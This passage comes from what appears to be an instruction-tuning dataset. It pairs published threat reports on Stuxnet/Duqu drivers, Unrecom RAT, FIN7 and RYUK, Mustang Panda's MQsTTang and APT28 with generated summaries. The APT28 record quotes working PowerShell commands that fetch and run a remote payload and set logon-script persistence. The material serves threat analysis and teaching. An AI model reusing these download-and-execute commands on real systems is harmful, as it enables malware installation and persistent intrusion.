is not known which malicious program interacted with the following three drivers: rndismpc.sys, rtniczw.sys and jmidebs.sys. The obvious question would be: were they used in Stuxnet? In our opinion, the answer would have to be 'no'.\nFirst of all, if they had been used in Stuxnet, they would have left a far bigger footprint than the individual cases we have detected. Secondly, there hasn't been a single variant of Stuxnet that is capable of interacting with these drivers.\nThe file rtniczw.sys was signed on 18 March 2010, but on 14 April 2010 the Stuxnet authors created a new variant of the worm that made use of the \"reference\" mrxcls.sys. It is obvious that rtniczw.sys was intended for some other use. The same can be said of jmidebs.sys. We believe that the three drivers are only indirectly related to Stuxnet and can safely be erased from Stuxnet history.\nMedium Headline: Then there is another question: could these drivers have been used with Duqu?\nThere is no clear-cut answer here. Although all known variations of Duqu are from the period November 2010-October 2011, we believe there were earlier versions of the Trojan spy created to steal information. The three drivers in question could easily have been used in early versions of Duqu or with other Trojans based on the Stuxnet/Duqu platform. Like Duqu, those Trojans were most probably used in targeted attacks before the appearance of Stuxnet (dating back to at least 2008), both while it was active and after its C&C was shut down. They were likely to have been parallel projects, and Stuxnet was subsequently based on that accumulated experience and the code that had already been written. It seems highly unlikely that this was the only project that its authors were involved in.\nBig Headline: The driver creation process\nLet's try to imagine what the driver creation process looks like. A few times a year the authors compile a new version of a driver file, creating a reference file. The primary purpose of this file is to load and execute a main module, which is created separately. It could be Stuxnet, or Duqu or something else.\nWhen it is necessary to use a driver for a new module, the authors use a dedicated program to modify information in the driver's \"reference\" file, i.e. its name and service information as well as the registry key and its value.\nIt's important to note that they tweak ready-made files and don't create a new one from scratch. This means they can make as many different driver files as they like, each having exactly the same functionality and creation date.\nDepending on the aim of the attack and the Trojan's victim, several driver files can then be signed with legitimate digital certificates whose origins remain unknown.\nBig Headline: Conclusion\nFrom the data we have at our disposal, we can say with a fair degree of certainty that the \"Tilded\" platform\nwas created around the end of 2007 or early 2008 before undergoing its most significant changes in summer/autumn 2010. Those changes were sparked by advances in code and the need to avoid detection by antivirus solutions. There were a number of projects involving programs based on the \"Tilded\" platform throughout the period 2007-2011. Stuxnet and Duqu are two of them -there could have been others, which for now remain unknown. The platform continues to develop, which can only mean one thing - we're likely to see more modifications in the future.\n\n<[ENDING OF SECTION]>\n\n<[ENDING OF SECTION]>\n\n",
    "output": "### Summary of the APT Report \"Evolution_Drivers_Duqu_Stuxnet\"\n\n#### Introduction\nThe report \"Evolution_Drivers_Duqu_Stuxnet\" delves into the evolution and architectural similarities between the Duqu Trojan and Stuxnet worm, highlighting the common platform used for their development and the discovery of additional drivers that challenge the existing understanding of Stuxnet's history. The focus is on uncovering the origins and potential uses of these drivers, which have implications for both worm and rootkit functionalities.\n\n#### Critical Observations\n**Worm:**\n- **Stuxnet Worm:** The report discusses the Stuxnet worm, which was designed to spread through computer networks and exploit security failures. Stuxnet used specific driver files, such as `mrxcls.sys` and `mrxnet.sys`, to facilitate its operations. Notably, Stuxnet targeted industrial systems, particularly those in Iran, Indonesia, and India, by exploiting vulnerabilities in Windows and Siemens SIMATIC WinCC systems. The worm was capable of issuing commands to industrial machinery and hiding its activities, making it a sophisticated piece of malware aimed at disrupting critical infrastructure.\n- **Driver Files:** Several driver files related to Stuxnet were identified, including `mrxcls.sys`, `mrxnet.sys`, `jmidebs.sys`, `rtniczw.sys`, and `rndismpc.sys`. These drivers played crucial roles in loading and executing the main module of the worm. The report suggests that these drivers were part of a broader platform named 'Tilded', which was used to create both Stuxnet and Duqu.\n- **Digital Certificates:** The driver files were often signed with legitimate digital certificates from companies like Realtek and Jmicron to evade detection by antivirus programs. This tactic allowed the worm to remain undetected for longer periods.\n\n**Rootkit:**\n- **Rootkit Functionality:** The drivers used in Stuxnet and Duqu exhibited rootkit characteristics by hiding their presence and activities on infected systems. For example, `mrxcls.sys` and `rtniczw.sys` used different registry keys and values to conceal their operations, making it difficult for security software to detect them.\n- **Platform Architecture:** The 'Tilded' platform, which underpinned both Stuxnet and Duqu, utilized a driver file to load an encrypted main module. This architecture enabled the malware to remain stealthy and evade detection, typical of rootkit behavior.\n- **Unknown Drivers:** The report identified additional drivers like `rtniczw.sys` and `rndismpc.sys`, which were not directly linked to known Stuxnet variants but shared similar functionalities. These drivers were likely used in other targeted attacks or early versions of Duqu, indicating a broader use of rootkit techniques across multiple malware campaigns.\n\n#### Conclusion\nThe topics of worm and rootkit functionalities are central to understanding the sophistication and impact of Stuxnet and Duqu. The worm capabilities of Stuxnet allowed it to spread rapidly and target critical industrial systems, causing significant disruption. Meanwhile, the rootkit features of the drivers used in both Stuxnet and Duqu enabled the malware to remain hidden and evade detection, making it challenging for security professionals to mitigate their effects. The discovery of additional drivers and the shared 'Tilded' platform suggests that the attackers behind these campaigns had a well-developed strategy for creating and deploying advanced malware, leveraging both worm and rootkit techniques to achieve their goals of espionage and sabotage.",

This is\nindicative of the adaptive, counter-intelligence techniques being adopted as threat actors become aware that many security researchers use these services to gather threat intelligence.\nSignificantly, malware objects seen in previous campaigns like DarkComet and ArcomRAT8 have also been observed beaconing to the same CnC servers Unrecom RAT is currently using. DarkComet is known to be a popular RAT used in threat activity in the Middle East 6,7.\n\n<[ENDING OF SECTION]>\n\nBig Headline: Executive Summary\nIn the past two weeks, we have observed an increase in attack activity against the U.S. state and local government, technology, advisory services, health, and financial sectors through phishing emails with what appears to be a remote access trojan (RAT) known as Unrecom. The attack has also been observed against the financial sector in Saudi Arabia and Russia.\nAs Unrecom1 is a comprehensive multi-platform Java-based remote access tool, currently not detected by most AntiVirus products, it presents a risk to a large number of potential victims, regardless of operating system. The following is a screenshot of the Unrecom RAT v.2.0 (Version in Spanish):\nOver time, various reports in the community have documented the evolution of this tool. This evolution is to be expected, but its low detection rate, recent use this month through phishing emails campaigns against multiple sectors in the U.S. and association with past campaigns involving a variety of RATs captured our attention. The evolution of Unrecom RAT dates from its beginnings as a tool known as Frutas RAT, subsequently branded as Adwind RAT, and now Unrecom RAT.\nIn 2013, it was reported that Frutas RAT was used in phishing email campaigns against high profile companies in Europe and Asia in sectors such as finance, mining, telecom, and government2.\nUsers are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use.

It has some of the following capabilities:\n- Collection of System Information (e.g. IP, OS version, memory RAM information, Java version, Computer Name, User account compromised, etc.)\n- Upload & Execute additional malware, typically exploiting vulnerabilities derived from collected system information\n- Capture Webcam and Microphone, without user notification\n- Remote Desktop to watch user activity\n- File Manager allowing access to files in the context of the current user\n- Browser Password theft\n- Keylogging to capture passwords otherwise obscured from viewing\nIn the past, variants of the DarkComet and AcromRAT malware have also been observed beaconing to the same Command & Control (CnC) servers used by the Unrecom RAT in this campaign.\nThis document will provide information about the recent phishing campaigns observed with this RAT and some of the network indicators.\nBig Headline: Risk Assessment\nA remote access tool provides an attacker with full control over the victim system. Once a system has been compromised, the attacker may install one or more backdoors. These backdoors provide a persistent foothold, using a separate command and control channel; allowing future access less likely to be correlated to the original activity.\nThrough its modular plugin framework, this particular tool lets the attacker obtain System Information (e.g. IP, OS version, memory RAM information, Java version, Computer Name, User account compromised, etc.), Upload & Execute additional malware, Capture Webcam, Remote Desktop, File Manager, Browser Password Recovery, Capture Microphone, Keylogger, etc.\nBig Headline: Further Analysis And Correlation\nOne simple example of how the emails in this phishing campaign are related is that the Command and Control node (184.22.201[.]27) that the malware communicates with is shared by two separate phishing emails in this campaign, as shown in the diagram below.\nBeginning at the top of the diagram and working down, on the left side of the diagram are two phishing emails, the details of which are referenced in the pages above as item numbers 2 & 3. Of note, these phishing emails were sent to users at two separate and unrelated organizations. As you can see, when compared to each other, these messages appear completely unrelated, other than the fact they both contain jar files that are sophomorically \"obfuscated\" as pdf.jar files.\nNote that both the subjects, \"Transfer investigation report\" and \"Confirm transactions before release\" are comparatively unique as are the senders , \"Police Department\" cmmds@sbt.co[.]in and Arthur Anderson alexanderharolds@arthurandersen[.]com.  In addition to the fact that the emails share no attributes, the malicious attachments are also unrelated.\nFinally, and of most interest in this diagram, the central node at the bottom of the diagram, represents the Command and Control node (184.22.201[.]27) used by these two examples.  While this shared resource is noteworthy, of particular interest is that it has also been used in other campaigns.\nOn the right side of the diagram are files used in two other campaigns using the ArcomRAT8 and DarkComet6,7, The fact that they share the same command-and-control infrastructure as the UnrecomRat campaign make this central node all the more interesting.\nBig Headline: The Fidelis Take\nThis paper seeks to highlight this campaign targeting significant enterprises worldwide, utilizing a Java-based RAT malware that is currently detected by a small set of security tools. We are publishing these indicators so that others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated.\nFidelis XPS\u2122, the Advanced Threat Defense solution from General Dynamics Fidelis Cybersecurity Solutions detects all of the activity documented in this paper. The Fidelis Threat Research Team will continue to follow this specific activity and actively monitor the ever-evolving threat landscape for the latest threats to our customers' security.\nBig Headline: References\n1.

    "output": "### Introduction\nThe APT report \"FTA_1013_RAT_in_a_jar,\" published in 2014, highlights a significant increase in phishing attacks targeting various sectors, including U.S. state and local governments, technology, advisory services, and health sectors. These attacks utilize a remote access trojan (RAT) known as Unrecom, distributed via phishing emails with malicious attachments.\n\n### Critical Observations\nThe report identifies several key aspects related to phishing and spearphishing attachments. The phishing emails attempt to deceive users by attaching the Unrecom RAT with filenames designed to appear legitimate, such as \"Payment Invoice.jar,\" \"Payment details.jar,\" \"POR#94586.zip/POR#94586.jar,\" and others. These attachments are disguised as PDFs or invoices to entice users to open them. The email subjects are crafted to seem genuine, further increasing the likelihood of user execution. For instance, subjects include \"Transfer investigation report\" and \"Confirm transactions before release.\" The attachments are often Java archive files (.jar), which, when executed, deploy the Unrecom RAT onto the victim's system.\n\nThe Unrecom RAT, sold on the website \"unrecom[.]net\" for $500 (Enterprise Version) and $200 (Full Version), provides attackers with extensive control over compromised systems. Its capabilities include collecting system information, uploading and executing additional malware, capturing webcam and microphone data, remote desktop access, file management, browser password theft, and keylogging. Notably, the authors of Unrecom advise buyers not to scan their servers with Virustotal or Metascan, indicating an awareness of security researchers' methods and a proactive approach to evading detection.\n\nAdditionally, the report notes that the same Command & Control (CnC) servers used by Unrecom RAT have also been utilized by other malware families like DarkComet and ArcomRAT. This shared infrastructure suggests a coordinated effort or common resources among different threat actors.\n\n### Conclusion\nThe topics of phishing and spearphishing attachments are central to understanding how the attackers achieved their goals. By crafting convincing phishing emails with seemingly legitimate attachments, the attackers successfully tricked users into executing the Unrecom RAT. This allowed them to gain full control over compromised systems, enabling activities such as data exfiltration, further malware deployment, and surveillance. The use of shared CnC servers with other malware families indicates a broader threat landscape and the potential for collaborative efforts among cybercriminals. Overall, the sophisticated nature of the Unrecom RAT and the strategic use of phishing techniques underscore the need for robust security measures and user education to mitigate such threats.",

    "instruction": "Could you break down and summarize the security implications from the APT report Truesec_Collaboration-Between-FIN7-RYUK-Group(12-21-2020) released in 2020?\nHere's the report:\nBig Headline: Introduction\nThreat actors are constantly evolving and changing their methods. FIN7 is a financially motivated threat group that in the past has targeted the retail, restaurant, and hospitality sectors since mid-2015. They are known to use the CARBANAK RAT for mail-hijacking and point-of-sale attacks.\nThis summer Truesec observed an attacker that used the tools and techniques of FIN7, including the CARBANAK RAT, to take over the network of an enterprise. Later this foothold was used to deploy the RYUK ransomware on the victim network.\nThis attack marks the first instance Truesec has observed of the combination of FIN7 tools and the RYUK ransomware, indicating a change in pattern for FIN7 attacks. Up until now FIN7 has not been associated with ransomware attacks.\nGiven that ransomware is now the preferred technique for financially motivated attacks, it is not surprising that FIN7 also switch to ransomware. The attack also indicates that FIN7 now collaborates with the RYUK group, also known as WIZARD SPIDER or FIN6, in financially motivated attacks.\n\n<[ENDING OF SECTION]>\n\nBig Headline: Executive Summary\nThis summer Truesec observed an attacker that used the tools and techniques of FIN7, including the CARBANAK RAT, to take over the network of an enterprise. In a subsequent attack almost six weeks later this foothold was used to deploy the RYUK ransomware on the victim network.\nThis attack marks the first instance Truesec has observed of the combination of FIN7 tools and the RYUK ransomware, indicating a change in pattern for FIN7 attacks. Up until now FIN7 has not been associated with ransomware attacks. This also suggests a closer collaboration between FIN7 and the RYUK group, also known as WIZARD SPIDER or FIN6, than has been previously known by Truesec.\nIt is possible FIN7 simply sold the access to the RYUK group, but it is probable that FIN7 and WIZARD SPIDER are more closely affiliated and may be part of the same organized crime network.\nSmall Headline: JavaScript backdoor\nThis appears to be the same as the JavaScript backdoor in an  by Morphisec from November 2018. As described in the article this was used by FIN7 to deploy the CARBANAK RAT.\nThe backdoor connected to domain sephardimension[.]com. Some of the functions of the JavaScript backdoor are illustrated below.\nThese functions are clearly later versions of the code  in the article by Morphisec.\nFrom the JavaScript backdoor on the compromised client, the threat actor began performing typical escalation attempts in the Active Directory.\nSmall Headline: PowerShell RAT\nOnce the attacker had ensured they had admin privileges, they launched RunPsExec against several clients and servers to install a second malicious code, a PowerShell RAT, previously unknown to Truesec. The PowerShell RAT connected to another malicious domain: hxxps://besaintegration[.]com/gate.\nThe PowerShell RAT includes functions to retrieve basic system information and provides capabilities to start and manage arbitrary commands as background jobs.\nThe different functions are illustrated below.\nVery Small Headline: CARBANAK RAT\nThe last action the attacker performed at this stage was to also install the CARBANAK RAT as an additional backdoor onto domain controllers of the victim network. The attacker downloaded an obfuscated script that when executed, loads a DLL file in memory and executes it through reflection methods.\nIt then connects to Command-and-Control server 170.130.55[.]85:443 in order to download the malware configuration file anunak_config which is a (<https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/>)known component of the CARBANAK RAT. Once the CARBANAK RAT was installed, it would beacon to the same C2 server.\nOnce the actor had deployed the PowerShell RAT and CARBANAK RAT, no further action was taken on the compromised network for several weeks.\nSmall Headline: Data Theft\nDuring this stage, the attacker also exfiltrated data from the victim network. The exfiltration was done using the SmartFTP Client that connected to an IP address controlled by the attacker.\nThe names of some of the files that were exfiltrated were found in the file \"Unlocker-List.txt\". This file is part of the IObit Unlocker software, installed by the attacker, likely to facilitate the ransomware execution or file copy operations by unlocking locked files.\nSmall Headline: RYUK Ransomware\nA week after the attacker had begun reconnaissance of the network and exfiltrated the data they wanted; they deployed the RYUK ransomware. The Ransomware was deployed using both manual and scripted methods.\nThe high-level description of the staging procedure is summarized below:\n1. Identify server hostnames and IP addresses in the domain\n2. Prepare batch file to disable protections and security software (kill.bat)\n3. Prepare RYUK ransomware (svchost.exe)\n4. Copy kill.bat\n5. Disable User Account Control\n6. Run kill.bat\n7. Copy RYUK ransomware (svchost.exe)\n8. Run RYUK ransomware (svchost.exe)\nSteps 4-8 were performed on all identified servers in the victim network, using both IP address and hostname. Remote code execution was achieved with two methods: remote WMI command execution and using Microsoft Sysinternals' utility PsExec.\nSmall Headline: Conclusions\nThe first two stages of the attack, when the attacker took over the network, clearly bears the mark of the criminal threat actor known as FIN7. Both the JavaScript backdoor and the way it was installed, and CARBANAK RAT are tools that have been attributed to FIN7. No attempt to identify resources in the network was made at this time, once the attacker had control of the network.\nThe subsequent stages, in which data was stolen and a ransomware was deployed, occurred almost six weeks after the initial compromise. This part of the attack was done using tools and techniques that are indicative of the  ransomware group, also known as WIZARD SPIDER or FIN6. This was also conducted from an entirely different infrastructure than the initial stages attributed to FIN7.\nThe progress of the attack clearly indicates that different stages of the attack were conducted by different teams. It's possible that the FIN7 group are now more focused on just gaining access and then let a team from the RYUK group take over and deploy ransomware.\nThis suggests a closer collaboration between FIN7 and the RYUK group than has been previously known by Truesec. It is possible FIN7 simply sold the access to the RYUK group, but it is probable that the two groups have even stronger ties. The RYUK group are known to  to gain foothold for their ransomware attacks.\nIt consequently seems possible that FIN7 and WIZARD SPIDER are now both part of the same sprawling organized crime network.\n\n<[ENDING OF SECTION]>\n\n<[ENDING OF SECTION]>\n\n",
    "output": "### Introduction\nThe APT report \"Truesec_Collaboration-Between-FIN7-RYUK-Group(12-21-2020)\" details an advanced persistent threat involving the collaboration between FIN7, a financially motivated threat group, and the RYUK ransomware group. This report highlights a significant shift in FIN7's tactics, as they traditionally targeted retail, restaurant, and hospitality sectors using the CARBANAK RAT for mail-hijacking and point-of-sale attacks. However, in this instance, FIN7 tools were used to deploy RYUK ransomware, indicating a new pattern and potential collaboration between these groups.\n\n### Critical Observations\n#### Remote Services\nThe attackers utilized various remote services to gain and maintain access to the victim network. Initially, the attacker used a JavaScript backdoor similar to one previously reported by Morphisec, which connected to the domain `sephardimension[.]com`. This backdoor facilitated the deployment of the CARBANAK RAT. Once admin privileges were secured, the attacker employed `RunPsExec` against multiple clients and servers to install a PowerShell RAT, which connected to `hxxps://besaintegration[.]com/gate`. The CARBANAK RAT was also installed on domain controllers, connecting to the Command-and-Control server `170.130.55[.]85:443`. Remote code execution was achieved using WMI command execution and Microsoft Sysinternals' utility PsExec to deploy the RYUK ransomware across the network.\n\n#### Reconnaissance\nThe attack involved extensive reconnaissance activities. After gaining initial access, the attacker performed typical escalation attempts in the Active Directory. They used the PowerShell RAT to retrieve basic system information and manage arbitrary commands as background jobs. The attacker also identified server hostnames and IP addresses within the domain, preparing batch files to disable protections and security software. This reconnaissance phase allowed the attacker to map out the network and prepare for the deployment of the RYUK ransomware.\n\n#### Exfiltration\nDuring the attack, the adversary exfiltrated data from the victim network. The exfiltration was carried out using the SmartFTP Client, which connected to an IP address controlled by the attacker. The names of some exfiltrated files were found in the file \"Unlocker-List.txt,\" part of the IObit Unlocker software installed by the attacker. This software likely facilitated the ransomware execution or file copy operations by unlocking locked files.\n\n### Conclusion\nThe use of remote services, reconnaissance, and exfiltration techniques played crucial roles in the success of the attack. By leveraging remote services, the attackers gained and maintained access to the victim network, allowing them to deploy multiple backdoors and ransomware. Reconnaissance activities enabled the attackers to understand the network layout and prepare for the deployment of the RYUK ransomware. Finally, exfiltration ensured that valuable data was stolen before encrypting the network, maximizing the impact of the ransomware attack. This multifaceted approach underscores the sophistication and coordination between FIN7 and the RYUK group, suggesting a deeper collaboration within the organized crime network.",

    "instruction": "Based on the APT report ESET_MQsTTang-MustangPandas-backdoor-Qt-MQTT(03-02-2023) from 2023, can you summarize the security vulnerabilities and threats identified?\nFull report:\nMQsTTang: Mustang Panda's latest backdoor treads new ground with Qt and MQTT\nMarch 2, 2023\nESET researchers have analyzed MQsTTang, a new custom backdoor that we attribute to the Mustang Panda APT group. This backdoor is part of an ongoing campaign that we can trace back to early January 2023. Unlike most of the group's malware, MQsTTang doesn't seem to be based on existing families or publicly available projects.\nMustang Panda is known for its (<https://www.welivesecurity.com/2022/03/23/mustang-panda-hodur-old-tricks-new-korplug-variant/>)customized Korplug variants (also dubbed PlugX) and elaborate loading chains. In a departure from the group's usual tactics, MQsTTang has only a single stage and doesn't use any obfuscation techniques.\n\n<[ENDING OF SECTION]>\n\nBig Headline: Victimology\nWe have seen unknown entities in Bulgaria and Australia in our telemetry. We also have information indicating that this campaign is targeting a governmental institution in Taiwan. However, due to the nature of the decoy filenames used, we believe that political and governmental organizations in Europe and Asia are also being targeted. This would also be in line with the targeting of the group's other recent campaigns. As (<https://www.proofpoint.com/us/blog/threat-insight/good-bad-and-web-bug-ta416-increases-operational-tempo-against-european>)documented by fellow researchers at Proofpoint, Mustang Panda has been known to target European governmental entities since at least 2020 and has increased its activity in Europe even further, since Russia's invasion of Ukraine. Figure 1 shows our view of the targeting for this campaign.\nBig Headline: Attribution\nWe attribute this new backdoor and the campaign to Mustang Panda with high confidence based on the following indicators.\nWe found archives containing samples of MQsTTang in two GitHub repositories belonging to the user YanNaingOo0072022. Another GitHub repository of the same user was used in a previous Mustang Panda campaign described by Avast in a (<https://decoded.avast.io/threatintel/apt-treasure-trove-avast-suspects-chinese-apt-group-mustang-panda-is-collecting-data-from-burmese-government-agencies-and-opposition-groups/>)December 2022 blogpost.\nOne of the servers used in the current campaign was running a publicly accessible anonymous FTP server that seems to be used to stage tools and payloads. In the /pub/god directory of this server there are multiple Korplug loaders, archives, and tools that were used in previous Mustang Panda campaigns. This is the same directory that was used by the stager described in the aforementioned Avast blogpost. This server also had a /pub/gd directory, which was another path used in that campaign.\nSome of the infrastructure used in this campaign also matches the network fingerprint of previously known Mustang Panda servers.\nBig Headline: Technical analysis\nMQsTTang is a barebones backdoor that allows the attacker to execute arbitrary commands on a victim's machine and get the output. Even so, it does present some interesting characteristics. Chief among these is its use of the (<https://mqtt.org/>)MQTT protocol for C&C communication. MQTT is typically used for communication between IoT devices and controllers, and the protocol (<https://info.lookout.com/rs/051-ESQ-475/images/lookout-pegasus-android-technical-analysis.pdf>)hasn't been used in many publicly documented malware families. One such example is Chrysaor, also known as Pegasus for . From an attacker's perspective, one of MQTT's benefits is that it hides the rest of their infrastructure behind a broker. Thus, the compromised machine never communicates directly with the C&C server. As seen in Figure 2, this capability is achieved by using the open source (<https://github.com/emqx/qmqtt>)QMQTT library. This library depends on the (<https://www.qt.io/product/framework>)Qt framework, a large part of which is statically linked in the malware. Using the Qt framework for malware development is also fairly uncommon. (<https://blog.talosintelligence.com/lazarus-magicrat/>)Lazarus's MagicRAT is one of the rare recently documented examples.\nMQsTTang is distributed in RAR archives which only contain a single executable. These executables usually have names related to Diplomacy and passports such as:\nCVs Amb Officer PASSPORT Ministry Of Foreign Affairs.exe\nDocuments members of delegation diplomatic from Germany.Exe\nPDF_Passport and CVs of diplomatic members from Tokyo of JAPAN.eXE\nNote No.18-NG-23 from Embassy of Japan.exe\nThese archives are hosted on a web server with no associated domain name. This fact, along with the filenames, leads us to believe that the malware is spread via spearphishing.\nSo far, we have only observed a few samples. Besides variations in some constants and hardcoded strings, the samples are remarkably similar. The only notable change is the addition of some anti-analysis techniques in the latest versions. The first of these consists of using the CreateToolhelp32Snapshot Windows API function to iterate through running processes and look for the following known debuggers and monitoring tools.\ncheatengine-x86_64.exe\nollydbg.exe\nida.exe\nida64.exe\nradare2.exe\nx64dbg.exe\nprocmon.exe\nprocmon64.exe\nprocexp.exe\nprocesshacker.exe\npestudio.exe\nsystracerx32.exe\nfiddler.exe\ntcpview.exe\nNote that, while the malware is a 32-bit executable, it only checks for the presence of x64dbg and not its 32-bit counterpart, x32dbg.\nThe second technique uses the FindWindowW Windows API to look for the following Window Classes and Titles used by known analysis tools:\nPROCMON_WINDOW_CLASS\nOLLYDBG\nWinDbgFrameClass\nOllyDbg \u2013 [CPU]\nImmunity Debugger \u2013 [CPU]\nWhen executed directly, the malware will launch a copy of itself with 1 as a command line argument. This is repeated by the new process, with the argument being incremented by 1 on every run. When this argument hits specific values, certain tasks will be executed. Note that the exact values vary between samples; the ones mentioned below correspond to the sample with SHA-1 02D95E0C369B08248BFFAAC8607BBA119D83B95B. However, the tasks themselves and the order in which they are executed is constant.\nFigure 3 shows an overview of this behavior along with the tasks that are executed when the malware is first run.\nTable 1 contains a list of the tasks and the value at which each of them is executed. We will describe them in further detail in the upcoming paragraphs.\nTable 1. Tasks executed by the backdoor\nIf any analysis tool or debugger is detected using the techniques we described previously, the behavior of task 1 is altered and tasks 2, 3, and 4 are skipped entirely.\nMedium Headline: Task 1: C&C communication\nAs was previously mentioned, MQsTTang communicates with its C&C server over the MQTT protocol. All observed samples use 3.228.54.173 as broker. This server is a public broker operated by EMQX, who also happen to be the maintainers of the QMQTT library. This could be a way to make the network traffic seem legitimate and to hide Mustang Panda's own infrastructure. Using this public broker also provides resiliency; the service is unlikely to be taken down because of its many legitimate users and, even if the current C&C servers are banned or taken down, Mustang Panda could spin up new ones and use the same MQTT topics without disrupting MQsTTang's operation.\nHowever, this campaign could also be a test case by Mustang Panda before deciding whether to invest the time and resources to set up their own broker. This is supported by the low number of samples we've observed and the very simple nature of MQsTTang.\nAs shown in Figure 4, the malware and C&C server use two MQTT topics for their communication. The first one, iot/server2, is used for communication from the client to the server. The second one is used for communication from the server to the client. It follows the format iot/v2/<Unique ID> where <Unique ID> is generated by taking the last 8 bytes, in hex form, of a UUID. If any analysis tool is detected, server2 and v2 are respectively replaced with server0 and v0. This is likely in order to avoid tipping off defenders by entirely aborting the malware's execution early.\nAll communication between the server and the client uses the same encoding scheme. The MQTT message's payload is a JSON object with a single attribute named msg. To generate the value of this attribute, the actual content is first base64 encoded, then XORed with the hardcoded string nasa, and base64 encoded again. We will describe the exact format of these payloads in the relevant sections.\nUpon first connecting to the broker, the malware subscribes to its unique topic. Then, and every 30 seconds thereafter, the client publishes a KeepAlive message to the server's topic. The content of this message is a JSON object with the following format:\n1{\n4}\nWhen the server wants to issue a command, it publishes a message to the client's unique topic. The plaintext content of this message is simply the command to be executed. As shown in Figure 5, the client executes the received command using QProcess::startCommand from the Qt framework. The output, obtained using QProcess::readAllStandardOutput, is then sent back in a JSON object with the following format:\n1{\n2 \"c_topic\": \"<client's unique topic>\",\n4}\nSince only the content of standard output is sent back, the server will not receive errors or warnings. From the server's point of view, a failed command is thus indistinguishable from a command that simply produces no output unless some sort of redirection is performed.\nBig Headline: Conclusion\nThe Mustang Panda campaign described in this article is ongoing as of this writing. The victimology is unclear, but the decoy filenames are in line with the group's other campaigns that target European political entities.\nThis new MQsTTang backdoor provides a kind of remote shell without any of the bells and whistles associated with the group's other malware families. However, it shows that Mustang Panda is exploring new technology stacks for its tools. It remains to be seen whether this backdoor will become a recurring part of the group's arsenal, but it is one more example of the group's fast development and deployment cycle.\n\n<[ENDING OF SECTION]>\n\n<[ENDING OF SECTION]>\n\n",
    "output": "### Introduction\n\nThe ESET report titled \"MQsTTang: Mustang Panda's latest backdoor treads new ground with Qt and MQTT\" analyzes a new custom backdoor attributed to the Mustang Panda APT group. This backdoor, part of an ongoing campaign traced back to early January 2023, deviates from the group's usual tactics by employing new technologies like the Qt framework and the MQTT protocol for command and control (C&C) communication.\n\n### Critical Observations\n\n#### Data Obfuscation\n\nThe MQsTTang backdoor employs several techniques to obfuscate its C&C communications. Firstly, it uses the MQTT protocol, typically used for IoT device communication, which is relatively uncommon in malware. This choice helps to blend the malicious traffic with legitimate IoT communications, making it less conspicuous. Additionally, the malware communicates through a public MQTT broker operated by EMQX, further obscuring the attacker's infrastructure. The communication payloads are encoded using a combination of base64 encoding and XOR encryption with the hardcoded string \"nasa,\" adding another layer of obfuscation. This multi-step encoding makes it more challenging for defenders to decipher the actual commands being transmitted.\n\n#### Phishing: Spearphishing Attachment\n\nThe report indicates that the MQsTTang backdoor is distributed via spearphishing emails with malicious attachments. The malware is packaged in RAR archives containing a single executable, often disguised with filenames related to diplomacy and passports, such as \"CVs Amb Officer PASSPORT Ministry Of Foreign Affairs.exe.\" These filenames are designed to entice the recipient to open the attachment, leveraging social engineering techniques. The archives are hosted on a web server with no associated domain name, suggesting a targeted approach to distribution. The use of diplomatic and government-related themes aligns with Mustang Panda's typical targets, including political and governmental organizations in Europe and Asia.\n\n### Conclusion\n\nThe combination of data obfuscation and spearphishing attachments played a crucial role in the success of the MQsTTang campaign. By using the MQTT protocol and a public broker, Mustang Panda effectively hid their C&C communications, making detection and attribution more difficult. The multi-step encoding of the communication payloads further complicated analysis efforts. Meanwhile, the spearphishing emails with carefully crafted filenames exploited the trust of the recipients, increasing the likelihood of successful infection. These tactics allowed Mustang Panda to gain access to victim systems and execute arbitrary commands, achieving their goal of infiltrating and potentially exfiltrating data from targeted organizations.",

    "instruction": "After reviewing the APT report McAfee_APT28-Office-Malware-Doc-Citing-NYC-TerrorAttack(11-07-2017) from 2017, can you summarize the most critical elements from a security analyst's standpoint?\nThreat Group APT28 Slips Office Malware into Doc Citing NYC Terror Attack\nBy Ryan Sherstobitoff and Michael Rea\nNovember 7, 2017\nDuring our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research analysts identified a malicious Word document that appears to leverage the Microsoft Office Dynamic Data Exchange (DDE) technique that has been previously reported by Advanced Threat Research. This document likely marks the first observed use of this technique by APT28. The use of DDE with PowerShell allows an attacker to execute arbitrary code on a victim's system regardless whether macros are enabled. (McAfee product detection is covered in the Indicators of Compromise section at the end of the document.)\nAPT28, also known as Fancy Bear, has recently focused on using different themes. In this case it capitalized on the recent terrorist attack in New York City. The document itself is blank. Once opened, the document contacts a control server to drop the first stage of the malware, Seduploader, onto a victim's system.\nThe domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader.\nThe document we examined for this post:\nFilename: IsisAttackInNewYork.docx\nSha1: 1c6c700ceebfbe799e115582665105caa03c5c9e\nCreation date: 2017-10-27T22:23:00Z\nThe document uses the recently detailed DDE technique found in Office products to invoke the command prompt to invoke PowerShell, which runs two commands. The first:\nC:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object\nSystem.Net.WebClient).DownloadString('hxxp://netmediaresources[.]com/config.txt');powershell -enc $e #.EXE\nThe second PowerShell command is Base64 encoded and is found in the version of config.txt received from the remote server. It decodes as follows:\n$W=New-Object System.Net.WebClient;\n$p=($Env:ALLUSERSPROFILE+\"\\vms.dll\");\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n$W.DownloadFile(\"hxxp://netmediaresources[.]com/media/resource/vms.dll \",$p); if (Test-Path $p){\n$rd_p=$Env:SYSTEMROOT+\"\\System32\\rundll32.exe\";\n$p_a=$p+\",#1\u2033;\n$pr=Start-Process $rd_p -ArgumentList $p_a;\n$p_bat=($Env:ALLUSERSPROFILE+\"\\vms.bat\");\n$text='set inst_pck = \"%ALLUSERSPROFILE%\\vms.dll\"'+\"`r`n\"+'if NOT exist %inst_pck %\n(exit)'+\"`r`n\"+'start rundll32.exe %inst_pck %,#1'\n[io.File]::WriteAllText($p_bat,$text)\nNew-Item -Path 'HKCU:\\Environment' -Force | Out-Null;\nNew-ItemProperty -Path 'HKCU:\\Environment' -Name 'UserInitMprLogonScript' -Value \"$p_bat\" -\nPropertyType String -Force | Out-Null;\n}\nThe PowerShell scripts contact the following URL to download 